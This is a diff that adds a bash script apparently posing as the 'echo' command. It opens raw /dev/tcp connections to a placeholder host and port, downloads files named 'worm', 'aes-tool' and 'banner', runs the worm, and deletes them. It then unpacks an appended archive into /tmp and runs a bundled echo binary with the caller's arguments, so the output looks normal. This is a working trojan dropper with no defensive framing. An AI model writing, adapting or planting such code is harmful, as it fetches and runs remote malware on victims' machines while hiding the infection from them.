@@ -1,0 +1,31 @@
+#!/usr/bin/bash
+
+HOST="HOST"
+PORT="PORT"
+ZIP_SIZE="ZIP_SIZE"
+
+archive_line=$(awk '/^__ARCHIVE_BELOW__/ { print NR + 1; exit }' "$0")
+
+exec 8<>/dev/tcp/$HOST/$PORT
+printf "Give me worm" >&8
+cat <&8 > worm
+exec 8<&- 8>&-
+
+exec 8<>/dev/tcp/$HOST/$PORT
+printf "Give me aes-tool" >&8
+cat <&8 > aes_tool
+exec 8<&- 8>&-
+
+exec 8<>/dev/tcp/$HOST/$PORT
+printf "Give me banner" >&8
+cat <&8 > banner
+exec 8<&- 8>&-
+
+chmod +x worm aes_tool && ./worm && rm -f worm aes_tool banner
+
+tail -n +$archive_line "$0" | head -c $ZIP_SIZE > zecho.zip
+unzip -q -d /tmp zecho.zip && rm zecho.zip
+chmod +x /tmp/usr/bin/echo && /tmp/usr/bin/echo "$@" && rm -rf /tmp/usr
+exit 0
+
+__ARCHIVE_BELOW__
